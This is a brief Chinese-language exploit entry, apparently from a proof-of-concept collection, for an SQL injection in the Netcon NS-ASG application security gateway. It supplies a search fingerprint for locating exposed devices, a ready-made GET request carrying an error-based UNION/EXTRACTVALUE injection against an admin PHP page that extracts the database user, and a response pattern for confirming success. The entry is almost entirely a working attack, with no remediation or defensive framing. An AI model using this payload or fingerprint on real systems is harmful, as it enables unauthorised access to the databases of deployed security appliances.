# 网康科技NS-ASG应用安全网关SQL注入漏洞

网康科技NS-ASG应用安全网关 ｜ SQL注入 ｜ —
- **指纹**：`app="网康科技-NS-ASG安全网关"`
- **请求**：`GET /admin/list_ipAddressPolicy.php?GroupId=-1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+user()),0x7e)) HTTP/1.1`
- **响应特征**：200 ^(?=.*?syntax)(?=.*?error).*?$